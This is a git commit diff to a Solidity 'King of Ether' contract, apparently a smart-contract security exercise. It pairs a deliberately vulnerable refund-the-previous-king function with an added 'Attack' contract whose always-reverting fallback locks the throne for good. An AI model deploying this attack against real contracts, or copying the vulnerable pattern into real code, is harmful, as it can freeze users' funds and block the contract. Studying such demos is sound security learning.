33a6a984232ecd4538ff2d21d8385def35283ca1
B0444110 <36958333+B0444110@users.noreply.github.com>
2020-12-20 16:34:20 +0800

    Update kingtrydapp.sol

--- KingOfEther/kingtrydapp.sol
+++ KingOfEther/kingtrydapp.sol
@@ -1,17 +1,26 @@
-pragma solidity ^0.5.5;
+pragma solidity ^0.4.10;
 
 contract kingOfCountry {
-    address payable  public king;
-    uint256 public price;
-    constructor() public{
-        price=1;
+    address public king;
+    uint256 price;
+
+    function kingOfCountry(uint256 _price) {
+        require(_price > 0);
+        price = _price;
+        king = msg.sender;
     }
-    function becomeking() payable public {
-        require(msg.value > 0);
-        
+
+    function becomeking() payable {
         require(msg.value > price); // 付錢當國王
         king.transfer(price);   // 給前任補償
         king = msg.sender;      // 加冕新國王
-        price = msg.value * 2;           // 付兩倍的錢當新國王
+        price = price * 2;           // 付兩倍的錢當新國王
+    }
+}
+contract Attack {
+    function () { revert(); }
+    
+    function Attack(address _target) payable {
+        _target.call.value(msg.value)(bytes4(keccak256("becomeking()")));
     }
 }
